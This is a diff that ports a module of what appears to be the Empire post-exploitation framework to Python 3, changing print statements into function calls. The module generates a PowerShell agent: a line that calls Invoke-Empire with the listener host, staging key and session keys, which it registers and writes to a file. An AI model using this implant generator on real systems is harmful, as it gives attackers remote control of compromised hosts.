@@ -1,10 +1,12 @@
+from __future__ import print_function
+from builtins import object
 import os
 import string
 from pydispatch import dispatcher
 from lib.common import helpers
 
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -68,7 +70,7 @@ class Module:
         outFile = self.options['OutFile']['Value']
 
         if listenerName not in self.mainMenu.listeners.activeListeners:
-            print helpers.color("[!] Error: %s not an active listener")
+            print(helpers.color("[!] Error: %s not an active listener"))
             return None
 
         activeListener = self.mainMenu.listeners.activeListeners[listenerName]
@@ -99,12 +101,12 @@ class Module:
         if language.lower() == 'powershell':
             agentCode += "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (host, stagingKey, sessionKey, sessionID)
         else:
-            print helpers.color('[!] Only PowerShell agent generation is supported at this time.')
+            print(helpers.color('[!] Only PowerShell agent generation is supported at this time.'))
             return ''
 
         # TODO: python agent generation - need to patch in crypto functions from the stager...
 
-        print helpers.color("[+] Pre-generated agent '%s' now registered." % (sessionID))
+        print(helpers.color("[+] Pre-generated agent '%s' now registered." % (sessionID)))
 
         # increment the supplied file name appropriately if it already exists
         i = 1
@@ -128,5 +130,5 @@ class Module:
         f.write(agentCode)
         f.close()
 
-        print helpers.color("[*] %s agent code for listener %s with sessionID '%s' written out to %s" % (language, listenerName, sessionID, outFile))
-        print helpers.color("[*] Run sysinfo command after agent starts checking in!")
+        print(helpers.color("[*] %s agent code for listener %s with sessionID '%s' written out to %s" % (language, listenerName, sessionID, outFile)))
+        print(helpers.color("[*] Run sysinfo command after agent starts checking in!"))
